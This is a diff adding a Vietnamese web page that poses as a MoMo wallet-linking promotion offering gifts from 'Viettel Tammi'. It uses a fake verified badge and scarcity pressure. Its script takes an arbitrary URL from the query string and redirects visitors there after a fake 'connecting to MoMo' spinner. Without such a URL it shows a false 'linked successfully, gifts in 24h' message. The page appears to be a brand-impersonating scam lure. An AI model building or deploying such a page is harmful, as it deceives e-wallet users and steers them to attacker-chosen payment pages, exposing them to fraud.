@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Liên Kết Ví MoMo – Nhận Quà Viettel Tammi</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(180deg, #a0153e 0%, #d91c5c 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ===== HEADER ===== */
+        .header {
+            background: linear-gradient(90deg, #ff6b9d 0%, #ff4081 100%);
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-text {
+            color: white;
+            font-size: 17px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .badge {
+            background: white;
+            color: #ff4081;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 700;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+        }
+
+        /* ===== CONTAINER ===== */
+        .container {
+            flex: 1;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* ===== LOGO ===== */
+        .logo-section {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            width: 100px;
+            height: 100px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            position: relative;
+        }
+
+        .logo-text {
+            font-size: 42px;
+            font-weight: 900;
+            color: #a0153e;
+            font-family: 'Arial Black', sans-serif;
+        }
+
+        .verified-badge {
+            position: absolute;
+            bottom: -5px;
+            right: -5px;
+            width: 32px;
+            height: 32px;
+            background: #00bfa5;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 3px solid white;
+        }
+
+        .verified-badge::before {
+            content: "✓";
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .title {
+            color: white;
+            font-size: 22px;
+            font-weight: 700;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+
+        .subtitle {
+            color: rgba(255,255,255,0.85);
+            font-size: 13px;
+            margin-top: 4px;
+        }
+
+        /* ===== CARD ===== */
+        .promo-card {
+            background: white;
+            border-radius: 20px;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+
+        /* Banner */
+        .promo-banner {
+            width: 100%;
+            height: 190px;
+            background: linear-gradient(135deg, #ffd89b 0%, #19547b 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .promo-banner::before {
+            content: "";
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.12) 1px, transparent 1px);
+            background-size: 20px 20px;
+            animation: sparkle 20s linear infinite;
+        }
+
+        @keyframes sparkle {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(50px, 50px); }
+        }
+
+        .banner-icon {
+            font-size: 40px;
+            z-index: 1;
+            position: relative;
+            margin-bottom: 4px;
+        }
+
+        .banner-text {
+            font-size: 26px;
+            font-weight: 900;
+            color: #ff4081;
+            text-shadow: 2px 2px 0 rgba(255,255,255,0.5);
+            z-index: 1;
+            position: relative;
+            letter-spacing: 1px;
+        }
+
+        .banner-sub {
+            font-size: 13px;
+            font-weight: 700;
+            color: #fff;
+            background: rgba(255,64,129,0.95);
+            padding: 4px 14px;
+            border-radius: 12px;
+            margin-top: 8px;
+            z-index: 1;
+            position: relative;
+            box-shadow: 0 4px 12px rgba(255,64,129,0.4);
+        }
+
+        .coins {
+            position: absolute;
+            font-size: 26px;
+            animation: float 3s ease-in-out infinite;
+            z-index: 1;
+        }
+
+        .coin-1 { top: 12px; left: 16px; animation-delay: 0s; }
+        .coin-2 { top: 24px; right: 20px; animation-delay: 0.5s; }
+        .coin-3 { bottom: 16px; left: 24px; animation-delay: 1s; }
+        .coin-4 { bottom: 12px; right: 16px; animation-delay: 1.5s; }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-12px); }
+        }
+
+        /* Content */
+        .promo-content {
+            padding: 24px 22px;
+        }
+
+        .promo-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 10px;
+            text-align: center;
+            line-height: 1.35;
+        }
+
+        .promo-title span { color: #d91c5c; }
+
+        .promo-desc {
+            font-size: 13.5px;
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        /* Gift list */
+        .gift-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 22px;
+        }
+
+        .gift-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 14px;
+            background: linear-gradient(135deg, #fff8e1, #fff3e0);
+            border-radius: 12px;
+            border: 1px solid #ffe082;
+        }
+
+        .gift-icon {
+            font-size: 24px;
+            flex-shrink: 0;
+        }
+
+        .gift-text strong {
+            display: block;
+            font-size: 14px;
+            color: #e65100;
+            margin-bottom: 2px;
+        }
+
+        .gift-text span {
+            font-size: 12px;
+            color: #8d6e63;
+        }
+
+        /* CTA Button */
+        .activate-btn {
+            width: 100%;
+            padding: 17px;
+            background: linear-gradient(90deg, #ff6b9d 0%, #ff4081 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 8px 20px rgba(255,64,129,0.4);
+            transition: all 0.3s;
+            font-family: inherit;
+        }
+
+        .activate-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 30px rgba(255,64,129,0.5);
+        }
+
+        .activate-btn:active { transform: translateY(0); }
+
+        .activate-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .momo-icon {
+            width: 22px;
+            height: 22px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            color: #a0153e;
+            font-size: 13px;
+        }
+
+        /* Viettel Tammi badge */
+        .partner-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 16px;
+            padding-top: 16px;
+            border-top: 1px dashed #e0e0e0;
+        }
+
+        .partner-label {
+            font-size: 12px;
+            color: #999;
+            font-weight: 600;
+        }
+
+        .partner-logo {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 13px;
+            font-weight: 700;
+            color: #d91c5c;
+        }
+
+        .partner-logo .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #d91c5c;
+        }
+
+        /* Conditions */
+        .conditions {
+            background: #fafafa;
+            border-radius: 12px;
+            padding: 14px 16px;
+            margin-top: 18px;
+        }
+
+        .conditions h4 {
+            font-size: 12px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .conditions ul {
+            list-style: none;
+            padding: 0;
+        }
+
+        .conditions ul li {
+            font-size: 12px;
+            color: #666;
+            padding: 4px 0 4px 18px;
+            position: relative;
+            line-height: 1.5;
+        }
+
+        .conditions ul li::before {
+            content: '✓';
+            color: #00bfa5;
+            font-weight: 700;
+            position: absolute;
+            left: 0;
+            top: 4px;
+            font-size: 11px;
+        }
+
+        /* Terms */
+        .terms {
+            font-size: 11px;
+            color: rgba(255,255,255,0.8);
+            text-align: center;
+            margin-top: 8px;
+            line-height: 1.5;
+            max-width: 500px;
+        }
+
+        /* Loading */
+        .loading {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(160, 21, 62, 0.9);
+            backdrop-filter: blur(4px);
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            z-index: 999;
+            color: white;
+        }
+
+        .loading.show { display: flex; }
+
+        .spinner {
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 14px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Success popup */
+        .success-modal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(4px);
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+
+        .success-modal.show { display: flex; }
+
+        .success-box {
+            background: #fff;
+            border-radius: 20px;
+            padding: 32px 24px;
+            max-width: 360px;
+            width: 100%;
+            text-align: center;
+            animation: popIn 0.4s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0.7); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .success-box .icon {
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #00bfa5, #4dd0c1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            font-size: 36px;
+            color: #fff;
+            box-shadow: 0 10px 25px rgba(0,191,165,0.4);
+        }
+
+        .success-box h3 {
+            font-size: 18px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .success-box p {
+            font-size: 13px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .success-box button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(90deg, #ff6b9d 0%, #ff4081 100%);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: inherit;
+        }
+
+        @media (max-width: 420px) {
+            .promo-content { padding: 20px 18px; }
+            .banner-text { font-size: 22px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- HEADER -->
+    <div class="header">
+        <div class="header-text">
+            <span class="badge">🎉 HOT</span>
+            Liên Kết Ví MoMo
+        </div>
+    </div>
+
+    <div class="container">
+
+        <!-- LOGO -->
+        <div class="logo-section">
+            <div class="logo">
+                <div class="logo-text">M</div>
+                <div class="verified-badge"></div>
+            </div>
+            <div class="title">Liên Kết Ví MoMo</div>
+            <div class="subtitle">Nhận quà từ Viettel Tammi</div>
+        </div>
+
+        <!-- CARD -->
+        <div class="promo-card">
+
+            <!-- BANNER -->
+            <div class="promo-banner">
+                <div class="coins coin-1">🪙</div>
+                <div class="coins coin-2">🎁</div>
+                <div class="coins coin-3">💰</div>
+                <div class="coins coin-4">✨</div>
+                <div class="banner-icon">🎁</div>
+                <div class="banner-text">NHẬN QUÀ</div>
+                <div class="banner-sub">Viettel Tammi × MoMo</div>
+            </div>
+
+            <!-- CONTENT -->
+            <div class="promo-content">
+                <div class="promo-title">
+                    Liên kết Ví MoMo nhận ngay<br>
+                    quà tặng từ <span>Viettel Tammi</span>
+                </div>
+
+                <div class="promo-desc">
+                    Chỉ cần liên kết Ví MoMo với Viettel Tammi,<br>
+                    bạn sẽ nhận ngay phần quà hấp dẫn!
+                </div>
+
+                <div class="gift-list">
+                    <div class="gift-item">
+                        <div class="gift-icon">🎁</div>
+                        <div class="gift-text">
+                            <strong>Quà tặng chào mừng</strong>
+                            <span>Nhận ngay khi liên kết thành công</span>
+                        </div>
+                    </div>
+                    <div class="gift-item">
+                        <div class="gift-icon">💰</div>
+                        <div class="gift-text">
+                            <strong>Ưu đãi hoàn tiền</strong>
+                            <span>Hoàn tiền khi thanh toán qua Ví MoMo</span>
+                        </div>
+                    </div>
+                    <div class="gift-item">
+                        <div class="gift-icon">🎫</div>
+                        <div class="gift-text">
+                            <strong>Voucher độc quyền</strong>
+                            <span>Ưu đãi riêng cho thành viên Viettel Tammi</span>
+                        </div>
+                    </div>
+                </div>
+
+                <button class="activate-btn" id="activateBtn" onclick="activatePromo()">
+                    <div class="momo-icon">M</div>
+                    Liên Kết Ngay – Nhận Quà
+                </button>
+
+                <!-- Partner -->
+                <div class="partner-row">
+                    <div class="partner-label">Đối tác:</div>
+                    <div class="partner-logo">
+                        <span class="dot"></span>
+                        Viettel Tammi
+                    </div>
+                </div>
+
+                <!-- Conditions -->
+                <div class="conditions">
+                    <h4>Điều kiện tham gia</h4>
+                    <ul>
+                        <li>Có tài khoản MoMo đã xác thực</li>
+                        <li>Liên kết Ví MoMo với Viettel Tammi lần đầu</li>
+                        <li>Mỗi tài khoản nhận quà 1 lần duy nhất</li>
+                        <li>Số lượng quà có hạn, ưu tiên ai nhanh tay</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- TERMS -->
+        <div class="terms">
+            * Chương trình có giới hạn, áp dụng theo điều khoản.<br>
+            MoMo và Viettel Tammi không chịu trách nhiệm cho các trường hợp gian lận.
+        </div>
+
+    </div>
+
+    <!-- LOADING -->
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+        <p>Đang kết nối Ví MoMo...</p>
+    </div>
+
+    <!-- SUCCESS MODAL -->
+    <div class="success-modal" id="successModal">
+        <div class="success-box">
+            <div class="icon">✓</div>
+            <h3>Liên kết thành công!</h3>
+            <p>Ví MoMo của bạn đã được liên kết với Viettel Tammi. Quà tặng sẽ được gửi đến trong 24h.</p>
+            <button onclick="closeSuccess()">Đã hiểu</button>
+        </div>
+    </div>
+
+    <script>
+        // Lấy URL thanh toán (nếu có) từ query param
+        const urlParams = new URLSearchParams(window.location.search);
+        const paymentUrl = urlParams.get('url');
+
+        function activatePromo() {
+            const loading = document.getElementById('loading');
+            loading.classList.add('show');
+
+            const btn = document.getElementById('activateBtn');
+            btn.disabled = true;
+
+            // Sau 1.5s: nếu có URL thì chuyển hướng, nếu không thì hiện popup thành công
+            setTimeout(() => {
+                loading.classList.remove('show');
+                if (paymentUrl) {
+                    window.location.href = paymentUrl;
+                } else {
+                    document.getElementById('successModal').classList.add('show');
+                    btn.disabled = false;
+                }
+            }, 1500);
+        }
+
+        function closeSuccess() {
+            document.getElementById('successModal').classList.remove('show');
+        }
+
+        // Đóng modal khi click ngoài
+        document.getElementById('successModal').addEventListener('click', function (e) {
+            if (e.target === this) closeSuccess();
+        });
+    </script>
+
+</body>
+</html>
